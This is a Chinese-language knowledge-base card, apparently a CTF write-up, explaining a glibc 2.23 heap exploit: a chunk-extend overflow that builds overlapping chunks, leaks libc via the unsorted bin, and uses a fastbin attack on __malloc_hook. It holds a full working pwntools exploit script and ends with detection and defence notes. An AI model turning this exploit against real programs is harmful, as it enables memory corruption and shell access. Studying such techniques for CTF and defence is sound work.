---
id: binary-pwn-heap-chunk-extend-size-overlap-unsorted-leak-fastbin-malloc-hook
title: Chunk Extend：堆溢出改相邻 chunk size 扩大 free 范围制造 overlapping，泄露 libc 后接 fastbin attack 打 __malloc_hook（glibc 2.23）
type: scenario
domain: binary
path: binary/pwn/heap
technique: chunk-extend-size-overlap-unsorted-leak-fastbin-malloc-hook
tags:
- pwn
- heap
- glibc
- chunk-extend
- overlapping
- unsorted-bin
- fastbin
- malloc-hook
- libc-leak
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V361
  verified_at: '2026-11-09T02:42:58+08:00'
  notes: '已对照原文全文与17张图核对：01/02/03.png 依次显示 4×0x60 块、chunk1 size 0x71→0xe1、free(1) 后 0xe0 unsorted 块；04-11.png 为 main/Menu/Add/Edit(固定 read 0x100 造成溢出)/Del(指针置零)/Pri(printf 泄露)/shell 后门源码；12.png 泄露值 0x7f...1b78 与 p &__malloc_hook=0x7f...1b10 相差 0x68；13.png free(3) fastbin 链；14/15/17.png 对比 malloc_hook-0x10（size 字段为指针值校验失败）与 -0x23（-0x1b 处 0x7f 通过）且返回指针为 malloc_hook-0x13；16.png 为改写后的 fastbin 链。全链 chunk extend→overlap→unsorted 泄露→fastbin attack→__malloc_hook 与原文一致。原文 EXP 脚本 edit(4,...) 残留 malloc_hook-0x10，而正文解释与调试截图均为 -0x23，卡内按正文/截图采用 -0x23 并明确写出 -0x10 会触发 malloc(): memory corruption (fast)，处理正确。原文无组件版本，affected_versions 留空正确（glibc 2.23 环境已在正文说明）。dedup top 候选均为其他重叠/攻击原语（UAF fastbin dup、calloc tcache overlap、fastbin+smallbin 合并、malloc_consolidate unlink、unsafe unlink、House of Lore 等），无改大相邻 size 的 chunk extend 专卡，dedup_review 成立。dup-scan.json（2026-11-08 19:10）早于建卡（2026-11-09 02:00），无涉及本卡 pair。未验证点：未在本地重跑 EXP（无题目二进制/libc）；frontmatter 无 sources/source_url（全库惯例）。'
url: /docs/binary/pwn/heap/binary-pwn-heap-chunk-extend-size-overlap-unsorted-leak-fastbin-malloc-hook/
draft: false
kb_aliases:
- Chunk Extend
- chunk extend 攻击
- 改 size 重叠堆块
- unsorted bin 泄露 main_arena
- fastbin attack malloc_hook
- 堆溢出扩大 chunk size
---

## 一句话结论

在存在堆溢出、能改写相邻 chunk 头的前提下，把下一个 chunk 的 size 从 0x71 改成 0xe1，`free` 时堆管理器会按假 size 把该 chunk 与其后一个 chunk 一起当成 0xe0 的大块放进 unsorted bin；随后 `malloc(0x60)` 把大块切回两个 0x70，一份返回给调用者（与已分配 chunk 重叠）、另一份作为 unsorted 剩余块（与另一个仍被引用的 chunk 重叠），前者可用于继续溢出、后者可用其 fd/bk（main_arena 指针）泄露 libc；最后用 fastbin attack 把 `__malloc_hook` 改成后门/one_gadget 拿 shell。

## 原理

- **free 只信 chunk 头里的 size**：`_int_free` 依据 `chunk->size`（去掉标志位）确定释放范围，不与真实分配记录核对。堆溢出改大 size 后，`free` 会把紧随其后的 chunk 一并划入"一个"大空闲块，造成某个仍被程序引用的 chunk 实际已处于堆管理器的空闲块内部。
- **本例布局**：连续 `add(0x60)` 四次，实际 chunk 大小都是 0x70（请求 0x60 → `request2size` 0x70）。`edit(0, 'a'*0x60 + '\x00'*8 + p64(0xe1))` 从 0 号块用户区写 0x100 字节：0x60 字节填满用户区，8 字节覆盖 1 号块的 `prev_size`，`p64(0xe1)` 覆盖 1 号块的 size（0x71 → 0xe1）。
- **free(1) 扩大释放**：1 号块按 0xe0 大小释放，覆盖 1 号块（0x70）与 2 号块（0x70）；前一块仍在使用（PREV_INUSE=1）、后一块 size 的 PREV_INUSE=1，不触发合并，整个 0xe0 进入 unsorted bin。
- **切分产生重叠**：`malloc(0x60)` 从 unsorted bin 取出 0xe0 切分——前 0x70 返回（与 1 号块重叠，记 chunk4），后 0x70 作为剩余块继续留在 unsorted bin，而它的用户区正好与仍被 `heaparray[2]` 引用的 2 号块重叠。
- **libc 泄露**：unsorted bin 中只有一个空闲块时，其 `fd`/`bk` 都指向 `main_arena+0x58`；`show(2)` 打印 2 号块内容即读到这两个指针。glibc 2.23 下 `main_arena+0x58` 与 `__malloc_hook` 相差 0x68（`malloc_hook = leaked - 0x68`），该偏移随 libc 版本变化，需按题目附件核对。
- **第二次重叠**：再 `malloc(0x60)` 把这个 0x70 剩余块整个取走（与 2 号块重叠，记 chunk4），它的下一个物理 chunk 就是 3 号块，于是对它的 `edit` 溢出可直接改写 3 号块的头与（释放后的）fd。
- **fastbin attack**：`free(3)` 使 0x70 的 3 号块进入 fastbin；用 chunk4 溢出写 `3 号块 fd = __malloc_hook-0x23`、size 保持 0x71。连续两次 `malloc(0x60)`：第一次弹出 3 号块并把 fastbin 头设为 fake chunk，第二次返回 fake chunk 的用户指针 `__malloc_hook-0x13`；`edit` 0x13 字节填充后写后门地址，正好覆盖 `__malloc_hook`。
- **为什么是 `__malloc_hook-0x23`**：`malloc(0x60)` 映射到 nb=0x70、fastbin index 5；取 fastbin 时检查 `chunksize(victim)` 的 index 是否等于请求 index。fake chunk 的 size 字段在 `target+8 = __malloc_hook-0x1b`，该处 qword 为 0x7f → chunksize 0x78 → index 5，校验通过。若用 `__malloc_hook-0x10`，size 字段读到的是 libc 指针值（如 0x00007f...），index 不匹配，malloc 直接 abort——这是该手法最常见的踩坑点。
- **触发**：任意一次 `malloc`（如 `add(0x18)`）都会调用 `__malloc_hook`，从而执行写入的后门/one_gadget。
- **边界**：需要可溢出的 edit（本例 `read(0, ptr, 0x100)` 不校验分配大小）；链基于 glibc 2.23（无 tcache、保留 `__malloc_hook`）；glibc 2.26+ 引入 tcache 后需改用 tcache poisoning 等变体，2.34+ 已移除 hooks。

## 触发条件

- 程序提供 add/edit/show/free 菜单；edit 写入长度大于申请大小（堆溢出），且 free 后指针置零（无 UAF 也可打）。
- 使用 glibc 2.23 一类无 tcache、存在 `__malloc_hook` 的 libc（本例 `libc-2.23-ubuntu11.3`）。
- 程序自身有后门（`system("/bin/sh")`）或可用的 one_gadget。
- 能按顺序申请/释放 0x70 大小的 chunk，且 show 可打印仍被引用的重叠块内容。

## 利用步骤

1. 连续申请 4 个 0x60 大小的块（实际 size 0x70），记录地址顺序。
2. 用 0 号块溢出：`'a'*0x60 + '\x00'*8 + p64(0xe1)`，把 1 号块 size 改成 0xe1。
3. `free(1)`：0xe0 大块进入 unsorted bin，覆盖 1、2 号块。
4. `add(0x60)` 切分大块：返回前 0x70（与 1 号块重叠，chunk4），剩余 0x70 留在 unsorted bin（与 2 号块重叠）。
5. `show(2)` 泄露 fd/bk，按 `malloc_hook = leak - 0x68`、`libc_base = malloc_hook - libc.sym['__malloc_hook']` 算地址（偏移按 libc 版本核对）。
6. 再 `add(0x60)` 取走剩余 0x70（与 2 号块重叠，chunk4），此时其下一物理块是 3 号块。
7. `free(3)` 进 fastbin；`edit(4, 'b'*0x60 + '\x00'*8 + p64(0x71) + p64(malloc_hook-0x23))` 改写 3 号块 fd 与 size。
8. 两次 `add(0x60)`：先弹出 3 号块，再从 `__malloc_hook-0x23` 的 fake chunk 分配；对第二次返回的块 `edit`：0x13 字节填充 + `p64(backdoor/one_gadget)`。
9. 再触发一次 `malloc`（如 `add(0x18)`），`__malloc_hook` 被调用，获得 shell。

## PoC

```python
from pwn import *
context(log_level='debug', os='linux', arch='amd64')
p = process('./pwn')
libc = ELF('./libc.so.6')          # 本例 libc-2.23-ubuntu11.3
shell_addr = 0x400946              # 程序后门 system("/bin/sh")

def add(size):  p.sendlineafter(b"5.Exit!", b"1"); p.sendlineafter(b"Please Input Size:", str(size).encode())
def dele(idx):  p.sendlineafter(b"5.Exit!", b"2"); p.sendlineafter(b"Please Input index:", str(idx).encode())
def show(idx):  p.sendlineafter(b"5.Exit!", b"4"); p.sendlineafter(b"Please Input index:", str(idx).encode())
def edit(idx, c): p.sendlineafter(b"5.Exit!", b"3"); p.sendlineafter(b"Please Input index:", str(idx).encode()); p.sendafter(b"Change EMo Content", c)

add(0x60); add(0x60); add(0x60); add(0x60)          # 0x010 / 0x080 / 0x0f0 / 0x160
edit(0, b'a'*0x60 + b'\x00'*8 + p64(0xe1))          # chunk1 size: 0x71 -> 0xe1
dele(1)                                             # 0xe0 进 unsorted bin（覆盖 chunk1+chunk2）
add(0x60)                                           # chunk4（与 chunk1 重叠），剩余 0x70 留 unsorted
show(2)                                             # 泄露 fd/bk = main_arena+0x58
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
malloc_hook = leak - 0x68                           # 偏移按 libc 版本核对
libc_base = malloc_hook - libc.sym['__malloc_hook']
add(0x60)                                           # 取走剩余 0x70（与 chunk2 重叠，chunk4）
dele(3)                                             # chunk3 进 fastbin
edit(4, b'b'*0x60 + b'\x00'*8 + p64(0x71) + p64(malloc_hook - 0x23))
add(0x60)                                           # 弹出 chunk3
add(0x60)                                           # fake chunk @ __malloc_hook-0x23
edit(5, b'd'*0x13 + p64(shell_addr))                # 覆盖 __malloc_hook
add(0x18)                                           # 触发 __malloc_hook
p.interactive()
```

注意：`malloc_hook-0x23` 才能通过 fastbin size 校验（size 字段处为 0x7f）；若把目标写成 `malloc_hook-0x10`，size 字段读到指针值会导致 `malloc(): memory corruption (fast)`。

## 变体与关联

- **同类重叠原语**：off-by-one 清 PREV_INUSE + 伪造 prev_size 向前合并见 [[binary-pwn-heap-newline-size-diff-0xa-offbyone-prev-inuse-overlap]]、[[binary-pwn-heap-glibc228-offby-null-prev-size-unlink-overlap]]；malloc_consolidate 触发 unlink 重叠见 [[binary-pwn-heap-malloc-consolidate-unlink-overlapping-via-malloc]]；fastbin+smallbin 伪造合并见 [[binary-pwn-heap-fastbin-smallbin-prev-inuse-free-overlapping]]。
- **fastbin→malloc_hook 变体**：UAF 双 free 版见 [[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]；无泄露爆破版见 [[binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce]]；无 show 版见 [[binary-pwn-heap-no-show-fastbin-unsorted-overlap-stdout-bruteforce-malloc-hook]]。
- **版本变体**：改 size 后在 tcache 版本可构造 tcache chunk overlap（tcache poisoning）；改到 small/large bin 范围可打 unsorted bin attack / largebin attack；现代 glibc 移除 hooks 后需改打 `_IO_list_all`/exit 链等。
- **边界**：edit 长度受严格校验、free 后采用隔离/随机化分配器（如某些 hardened allocator）、或 glibc 版本不匹配（偏移 0x68 变化）时需调整。

## 检测与防御

- **防御（程序侧）**：edit 严格按分配大小限长（`read(0, ptr, size)` 而非固定 0x100）；free 后置零并校验 size/prev_size 一致性；使用 safe-linking（glibc 2.32+）增加 fastbin fd 伪造难度；升级到移除 `__malloc_hook` 的 glibc（2.34+）。
- **调试/检测线索**：`heap` 视图中某 chunk 的 size 大于其申请大小、且其内部出现其它已分配 chunk 头/指针；unsorted bin 中的块地址与仍在使用的指针区间重叠；fastbin 链上出现 libc 地址（`__malloc_hook-0x23` 一类）；`malloc_printerr("malloc(): memory corruption (fast)")` 说明伪造 size 校验失败。
- **利用侧注意**：泄露得到的 `main_arena` 偏移、`__malloc_hook` 差值都依赖 libc 版本，必须用题目附件校准；fastbin attack 的 target 需满足 size 字段的 index 校验。
